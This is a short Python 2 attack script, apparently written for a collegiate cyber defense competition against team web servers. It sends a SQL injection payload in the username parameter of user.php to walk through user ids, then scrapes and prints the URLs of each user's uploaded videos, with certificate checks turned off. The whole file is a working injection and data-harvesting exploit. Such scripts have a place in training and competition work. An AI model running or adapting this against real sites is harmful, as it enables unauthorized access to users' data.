import requests
import subprocess
import sys
import re
import time
import urllib
team = sys.argv[1]
http = sys.argv[2]

url = http+"://www.team"+str(team)+".isucdc.com/"
#url = "http://10.0.0.50/"

i = 1
user_count = 0

#it is possible that users count be deleted and that certain id's won't exist in the database,
# but there will still be users after that
user_miss_count = 0
#script will stop after three consecutive "Sorry we couldn't find that user" messages
user_miss_thres = 3

video_count = 0

while (True):
	try:
		str1 = "' or id="+str(i)+" -- "
		url1 = url+"user.php?username="+str1
		r = requests.get(url1, verify=False)

		if("Sorry we couldn't find that user" not in str(r.text)):
			videos = re.findall('view.php\?video=[a-zA-Z0-9]*"><img',str(r.text))
			for video in videos:
				shortname = video[15:-6]
				r2 = requests.get(url+"view.php?video="+shortname, verify=False)
				shortname_with_ext = re.search('media/'+shortname+'*.[a-zA-Z0-9]*"',str(r2.text))
				shortname_with_ext = shortname_with_ext.group(0)[6:-1]
				print url+"media/"+shortname_with_ext
				video_count += 1
			user_miss_count = 0
			user_count += 1
				
		else:
			user_miss_count += 1
			if(user_miss_count >= user_miss_thres):
				print "\nDone"
				print str(user_count)+" Users found"
				print str(video_count)+" Videos found"
				break
	except:
		print "Error with: "+url1
		break
	i += 1
